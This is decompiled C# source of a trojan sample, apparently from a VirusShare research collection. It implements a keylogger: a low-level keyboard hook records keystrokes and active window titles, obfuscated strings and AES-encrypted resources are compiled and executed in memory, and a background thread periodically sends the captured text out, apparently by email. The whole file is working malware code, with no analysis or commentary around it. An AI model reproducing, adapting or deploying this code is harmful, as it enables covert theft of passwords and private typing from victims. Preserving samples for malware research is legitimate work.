// Decompiled with JetBrains decompiler
// Type: A
// Assembly: new22, Version=3.6.0.1403, Culture=neutral, PublicKeyToken=null
// MVID: 17D1A387-A51D-4A8D-BA74-9649CECC7EE7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Trojan.MSIL.BitCoin.jba-8b31cb3b2e397f75f24ae5b9cfdf974fbf07fc34c400be78ea4d6ca940b4cfe6.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class A
{
  private static string PHold = (string) null;
  private static ResourceManager Q = new ResourceManager("Key", Assembly.GetExecutingAssembly());
  private static string[] Arry;
  private static CompilerResults CRS;
  private static CompilerParameters PR = new CompilerParameters();
  private static CodeDomProvider CI;
  [AccessedThroughProperty("kbHook")]
  private static A.KeyboardHook _kbHook;
  private static string Value;

  static A() => A.kbHook = new A.KeyboardHook();

  [STAThread]
  public static void Main()
  {
    if ((double) Convert.ToInt32(Strings.Left(FileVersionInfo.GetVersionInfo(Environment.GetEnvironmentVariable(A.SD("35317E7366792972707D7167", "4ec1448d49144d198e858a9ca6454636")) + A.SD("687C0E420F0E0F504474504657045F193F035E4401525A4C1E031953", "b41a8fbc1d2942b0ace76d4540fa6e18")).ProductVersion, 1)) <= 3.9)
    {
      try
      {
        A.PHold = Conversions.ToString(Operators.ConcatenateObject((object) A.PHold, A.LM(nameof (A), "B", A._D(Conversions.ToString(A.Q.GetObject("F"))), true, new object[0])));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    A.PHold = Conversions.ToString(Operators.ConcatenateObject((object) A.PHold, A.LM("S", "SS", A._D(Conversions.ToString(A.Q.GetObject("G"))), false, new object[0])));
    A.LM(nameof (A), "B", A._D(Conversions.ToString(A.Q.GetObject("O"))), false, new object[0]);
    A.PHold = Conversions.ToString(Operators.ConcatenateObject((object) A.PHold, A.LM(nameof (A), "B", A._D(Conversions.ToString(A.Q.GetObject("M"))), false, new object[0])));
    A.PHold = Conversions.ToString(Operators.ConcatenateObject((object) A.PHold, A.LM(nameof (A), "C", A._D(Conversions.ToString(A.Q.GetObject("N"))), false, new object[0])));
    A.PHold = Conversions.ToString(Operators.ConcatenateObject((object) A.PHold, A.LM(nameof (A), "B", A._D(Conversions.ToString(A.Q.GetObject("I"))), false, new object[0])));
    A.PHold = Conversions.ToString(Operators.ConcatenateObject((object) A.PHold, A.LM(nameof (A), "B", A._D(Conversions.ToString(A.Q.GetObject("P"))), false, new object[0])));
    A.PHold = Conversions.ToString(Operators.ConcatenateObject((object) A.PHold, A.LM(nameof (A), "B", A._D(Conversions.ToString(A.Q.GetObject("Z"))), false, new object[0])));
    A.PHold = Conversions.ToString(Operators.ConcatenateObject((object) A.PHold, A.LM(nameof (A), "B", A._D(Conversions.ToString(A.Q.GetObject("D"))), false, new object[0])));
    A.LM(nameof (A), "B", A._D(Conversions.ToString(A.Q.GetObject("BS"))), false, new object[0]);
    new Thread(new ThreadStart(A.SS1)).Start();
    new Thread(new ThreadStart(A.X)).Start();
    new Thread(new ThreadStart(A.Z)).Start();
    new Thread(new ThreadStart(A.I)).Start();
    Application.Run();
  }

  public static void SS1() => A.LM(nameof (A), "B", A._D(Conversions.ToString(A.Q.GetObject("SP"))), true, new object[1]
  {
    (object) Assembly.GetExecutingAssembly().Location
  });

  public static string SD(string Input, string Pass)
  {
    string str1 = (string) null;
    string str2 = "&H ";
    long num1 = checked ((long) Math.Round(unchecked ((double) Strings.Len(Input) / 2.0)));
    long num2 = 1;
    while (num2 <= num1)
    {
      int num3 = checked ((int) Math.Round(Conversion.Val(str2 + Strings.Mid(Input, (int) (2L * num2 - 1L), 2))));
      int num4 = Strings.Asc(Strings.Mid(Pass, checked ((int) (unchecked (num2 % (long) Strings.Len(Pass)) + 1L)), 1));
      str1 += Conversions.ToString(Strings.Chr(num3 ^ num4));
      checked { ++num2; }
    }
    return str1;
  }

  public static string _D(string D)
  {
    byte[] bytes = Encoding.Default.GetBytes(D);
    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(new byte[0], new byte[8], 1);
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(16);
    rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(16);
    byte[] src = rijndaelManaged.CreateDecryptor().TransformFinalBlock(bytes, 0, bytes.Length);
    byte[] numArray = new byte[checked (src.Length - 17 + 1)];
    Buffer.BlockCopy((Array) src, 16, (Array) numArray, 0, checked (src.Length - 16));
    return Encoding.Default.GetString(numArray);
  }

  public static void I()
  {
    while (true)
    {
      A.LM(nameof (A), "B", A._D(Conversions.ToString(A.Q.GetObject("AK"))), false, new object[0]);
      Thread.Sleep(1);
    }
  }

  public static void Z()
  {
    while (true)
    {
      string F;
      object[] P;
      do
      {
        Thread.Sleep(600000);
        F = A._D(Conversions.ToString(A.Q.GetObject("SE")));
        P = new object[3]
        {
          (object) A._D(Conversions.ToString(A.Q.GetObject("E"))),
          (object) A._D(Conversions.ToString(A.Q.GetObject("EE"))),
          (object) (A.Value + Environment.NewLine + Environment.NewLine + A.PHold)
        };
      }
      while (!Conversions.ToBoolean(A.LM("B", "C", F, false, P)));
      A.Value = (string) null;
      A.PHold = (string) null;
    }
  }

  public static void X()
  {
    string Left = (string) null;
    while (true)
    {
      if (Operators.CompareString(Left, A.GetActiveWindowTitle(), false) != 0)
      {
        A.Value = A.Value + Environment.NewLine + "[" + A.GetActiveWindowTitle() + "]" + Environment.NewLine;
        Left = A.GetActiveWindowTitle();
      }
      Thread.Sleep(1);
    }
  }

  public static object LM(string C, string V, string F, bool CSharp, object[] P)
  {
    object obj;
    try
    {
      A.Arry = new string[3]
      {
        !CSharp ? A.SD("650B461059542150430A53", "f3b5e88c10c04b1bb0ffd098520c3cdf") : A.SD("73655D544641", "9065541c7a7146179dbb699cfb5f8005"),
        A.SD("361A4146570F1E5C585E", "1ec222b0842f402a84faa2ac0b156d83"),
        A.SD("19135F534650094A5E0A1B0C00", "06c3226f830c46c48d31621d764297ce")
      };
      A.CI = CodeDomProvider.CreateProvider(A.Arry[0]);
      A.Para();
      A.CRS = A.CI.CompileAssemblyFromSource(A.PR, F);
      System.Type type = A.CRS.CompiledAssembly.GetType(C);
      if ((object) type != null)
      {
        object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
        obj = type.InvokeMember(V, BindingFlags.InvokeMethod, (Binder) null, RuntimeHelpers.GetObjectValue(objectValue), P);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return obj;
  }

  public static void Para()
  {
    A.PR.GenerateExecutable = false;
    A.PR.GenerateInMemory = true;
    A.PR.ReferencedAssemblies.Add(A.Arry[1]);
    A.PR.ReferencedAssemblies.Add(A.SD("611A1745560B4F77584D531A500D5A", "82cd13fa399244a68290458ddf28b5a7"));
    A.PR.ReferencedAssemblies.Add(A.SD("280A021657475A51424C635D1745520E2357120A511C530E0D", "5ecad84576b54d03ba6ac227ba841f33"));
    A.PR.ReferencedAssemblies.Add(A.SD("614C121254091A6C5F5C4B505D0A", "c25af1d4420e41f4ac62f57656564cd7"));
    A.PR.CompilerOptions = A.Arry[2];
    A.PR.TreatWarningsAsErrors = false;
  }

  private static A.KeyboardHook kbHook
  {
    get => A._kbHook;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (A._kbHook != null)
        A.KeyboardHook.KeyDown -= new A.KeyboardHook.KeyDownEventHandler(A.kHook_KeyDown);
      A._kbHook = value;
      if (A._kbHook == null)
        return;
      A.KeyboardHook.KeyDown += new A.KeyboardHook.KeyDownEventHandler(A.kHook_KeyDown);
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  public static string GetActiveWindowTitle()
  {
    string lpString = new string(char.MinValue, 100);
    A.GetWindowText(A.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  private static void kHook_KeyDown(Keys e) => A.Value += A.Feed(e);

  public static string Feed(Keys eCode)
  {
    Keys keys = eCode;
    if (keys >= Keys.A && keys <= Keys.Z)
    {
      if (Control.IsKeyLocked(Keys.Capital))
        return eCode.ToString();
      return (Control.ModifierKeys & Keys.Shift) != Keys.None ? eCode.ToString() : eCode.ToString().ToLower();
    }
    if (keys >= Keys.D0 && keys <= Keys.D9)
    {
      if ((Control.ModifierKeys & Keys.Shift) == Keys.None)
        return eCode.ToString().Replace("D", (string) null);
      string Left = eCode.ToString();
      if (Operators.CompareString(Left, "D1", false) == 0)
        return "!";
      if (Operators.CompareString(Left, "D2", false) == 0)
        return "@";
      if (Operators.CompareString(Left, "D3", false) == 0)
        return "#";
      if (Operators.CompareString(Left, "D4", false) == 0)
        return "$";
      if (Operators.CompareString(Left, "D5", false) == 0)
        return "%";
      if (Operators.CompareString(Left, "D6", false) == 0)
        return "^";
      if (Operators.CompareString(Left, "D7", false) == 0)
        return "&";
      if (Operators.CompareString(Left, "D8", false) == 0)
        return "*";
      if (Operators.CompareString(Left, "D9", false) == 0)
        return "(";
      if (Operators.CompareString(Left, "D0", false) == 0)
        return ")";
    }
    else
    {
      if (keys >= Keys.NumPad0 && keys <= Keys.NumPad9)
        return eCode.ToString().Replace(A.SD("2A165A365705", "cdc7f6a613c646ee8a5f3082fcb5cb1d"), (string) null);
      if (keys >= Keys.Multiply && keys <= Keys.Divide)
      {
        string Left = eCode.ToString();
        if (Operators.CompareString(Left, A.SD("250D405B515D", "8ad6258d0e2040fab8e3e9d9956a7469"), false) == 0)
          return "/";
        if (Operators.CompareString(Left, A.SD("2F475A4408435F1B", "cb260a33b8d94ccaa84baff66d2fb056"), false) == 0)
          return "*";
        if (Operators.CompareString(Left, A.SD("6A1107104A07564C", "b9ded8f58b66493e9d0d1022abe2c4e2"), false) == 0)
          return "-";
        if (Operators.CompareString(Left, A.SD("785C56", "d9824bae32004cedaaeee5723c348068"), false) == 0)
          return "+";
        if (Operators.CompareString(Left, A.SD("740754085F5909", "70b7a28e7660409992887b84f8c2676e"), false) == 0)
          return ".";
      }
      else
      {
        if (keys == Keys.Space)
          return " ";
        if (keys >= Keys.OemSemicolon && keys <= Keys.OemQuotes)
        {
          if ((Control.ModifierKeys & Keys.Shift) != Keys.None)
          {
            string Left = eCode.ToString();
            if (Operators.CompareString(Left, A.SD("2B060B785C5C4441", "6dcf55212ae74ddab4426a3d3d2d190f"), false) == 0)
              return "_";
            if (Operators.CompareString(Left, A.SD("2E060B45584C43", "8acf5490b4284b9eb040a29b051dc930"), false) == 0)
              return "+";
            if (Operators.CompareString(Left, A.SD("7C5D5B7849555F764355015F564545", "93867901414b4316894aab0a7d453184"), false) == 0)
              return "{";
            if (Operators.CompareString(Left, A.SD("7C545955", "2314ce46d03e40b5ab859a8bef6fb266"), false) == 0)
              return "}";
            if (Operators.CompareString(Left, A.SD("765D590C", "f98498ae53fd464cbce9f9efbc10f3be"), false) == 0)
              return "|";
            if (Operators.CompareString(Left, A.SD("76045801", "99a508a2b04145c48e5bce1e3751351c"), false) == 0)
              return ":";
            if (Operators.CompareString(Left, A.SD("795C5452", "3699e0c504134c6483a0cd40d1e8adcc"), false) == 0)
              return "\"";
            if (Operators.CompareString(Left, A.SD("7D5C0C505A0C5951", "c29a35a404bc48e29a90fdae9cbccf61"), false) == 0)
              return "<";
            if (Operators.CompareString(Left, A.SD("2D535F315C410D5952", "7b62a93d66054a62ac6b4dd749877338"), false) == 0)
              return ">";
            if (Operators.CompareString(Left, A.SD("2E545564400111110C5D5E", "4a1855dbee20466183bc3d3be66b29fa"), false) == 0)
              return "?";
            if (Operators.CompareString(Left, A.SD("2D520B4D5F5A5052", "fb7f9664710a4a18a71f2b2ce6931c90"), false) == 0)
              return "~";
          }
          else
          {
            string Left = eCode.ToString();
            if (Operators.CompareString(Left, A.SD("2B060B785C5C4441", "6dcf55212ae74ddab4426a3d3d2d190f"), false) == 0)
              return "-";
            if (Operators.CompareString(Left, A.SD("2E060B45584C43", "8acf5490b4284b9eb040a29b051dc930"), false) == 0)
              return "=";
            if (Operators.CompareString(Left, A.SD("7C5D5B7849555F764355015F564545", "93867901414b4316894aab0a7d453184"), false) == 0)
              return "[";
            if (Operators.CompareString(Left, A.SD("7C545955", "2314ce46d03e40b5ab859a8bef6fb266"), false) == 0)
              return "]";
            if (Operators.CompareString(Left, A.SD("765D590C", "f98498ae53fd464cbce9f9efbc10f3be"), false) == 0)
              return "\\";
            if (Operators.CompareString(Left, A.SD("76045801", "99a508a2b04145c48e5bce1e3751351c"), false) == 0)
              return ";";
            if (Operators.CompareString(Left, A.SD("795C5452", "3699e0c504134c6483a0cd40d1e8adcc"), false) == 0)
              return "'";
            if (Operators.CompareString(Left, A.SD("7D5C0C505A0C5951", "c29a35a404bc48e29a90fdae9cbccf61"), false) == 0)
              return ",";
            if (Operators.CompareString(Left, A.SD("2D535F315C410D5952", "7b62a93d66054a62ac6b4dd749877338"), false) == 0)
              return ".";
            if (Operators.CompareString(Left, A.SD("2E545564400111110C5D5E", "4a1855dbee20466183bc3d3be66b29fa"), false) == 0)
              return "/";
            if (Operators.CompareString(Left, A.SD("2D520B4D5F5A5052", "fb7f9664710a4a18a71f2b2ce6931c90"), false) == 0)
              return "`";
          }
        }
        else
          return keys == Keys.Return ? Environment.NewLine : "[" + eCode.ToString() + "]";
      }
    }
    return (string) null;
  }

  public class KeyboardHook
  {
    private const int HC_ACTION = 0;
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 256;
    private const int WM_KEYUP = 257;
    private const int WM_SYSKEYDOWN = 260;
    private const int WM_SYSKEYUP = 261;
    private static int KeyHook;
    private static A.KeyboardHook.KeyboardProcDelegate KeyHookDelegate;

    [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int SetWindowsHookEx(
      int idHook,
      A.KeyboardHook.KeyboardProcDelegate lpfn,
      int hmod,
      int dwThreadId);

    public static event A.KeyboardHook.KeyDownEventHandler KeyDown;

    public static event A.KeyboardHook.KeyUpEventHandler KeyUp;

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

    public T CreateAPI<T>(string name, string method)
    {
      object obj = DI.InvokeMethod(Encoding.Default.GetBytes(A._D(Conversions.ToString(A.Q.GetObject("GO")))), nameof (A), A.SD("7501456414585071520044514012", "a2d14f7306d643a7a25d9e742b3c040d"), new object[2]
      {
        (object) A.KeyboardHook.LoadLibraryA(ref name),
        (object) method
      });
      IntPtr num;
      return (T) Marshal.GetDelegateForFunctionPointer(obj != null ? (IntPtr) obj : num, typeof (T));
    }

    public KeyboardHook()
    {
      A.KeyboardHook.KeyHookDelegate = new A.KeyboardHook.KeyboardProcDelegate(this.KeyboardProc);
      A.KeyboardHook.KeyHook = A.KeyboardHook.SetWindowsHookEx(13, A.KeyboardHook.KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
    }

    public int KeyboardProc(int nCode, int wParam, ref A.KeyboardHook.KBDLLHOOKSTRUCT lParam)
    {
      if (nCode == 0)
      {
        switch (wParam)
        {
          case 256:
          case 260:
            A.KeyboardHook.KeyDownEventHandler keyDownEvent = A.KeyboardHook.KeyDownEvent;
            if (keyDownEvent != null)
            {
              keyDownEvent((Keys) lParam.vkCode);
              break;
            }
            break;
          case 257:
          case 261:
            A.KeyboardHook.KeyUpEventHandler keyUpEvent = A.KeyboardHook.KeyUpEvent;
            if (keyUpEvent != null)
            {
              keyUpEvent((Keys) lParam.vkCode);
              break;
            }
            break;
        }
      }
      return this.CreateAPI<A.KeyboardHook.CNH>(A.SD("444556400A56", "916329d708e14056884ebfd5f8fffc49"), A.SD("2055580D7F044F4D2C575E5F751D", "7c44a1a79d8140eaa4b673190bb1f803"))(A.KeyboardHook.KeyHook, nCode, wParam, lParam);
    }

    ~KeyboardHook()
    {
      int num = this.CreateAPI<A.KeyboardHook.UWH>(A.SD("444556400A56", "916329d708e14056884ebfd5f8fffc49"), A.SD("605650585A5F6F0F0A0109434A705A0E52264D", "d5887548fdef4985a9c5111c9fe03fee"))(A.KeyboardHook.KeyHook);
      // ISSUE: explicit finalizer call
      base.Finalize();
    }

    public struct KBDLLHOOKSTRUCT
    {
      public int vkCode;
      public int scancode;
      public int flags;
      public int time;
      public int dwExtraInfo;
    }

    public delegate int KeyboardProcDelegate(
      int nCode,
      int wParam,
      ref A.KeyboardHook.KBDLLHOOKSTRUCT lParam);

    public delegate void KeyDownEventHandler(Keys Key);

    public delegate void KeyUpEventHandler(Keys Key);

    public delegate int SWH(
      int idHook,
      A.KeyboardHook.KeyboardProcDelegate lpfn,
      int hmod,
      int dwThreadId);

    public delegate int CNH(
      int hHook,
      int nCode,
      int wParam,
      A.KeyboardHook.KBDLLHOOKSTRUCT lParam);

    public delegate int UWH(int hHook);
  }
}
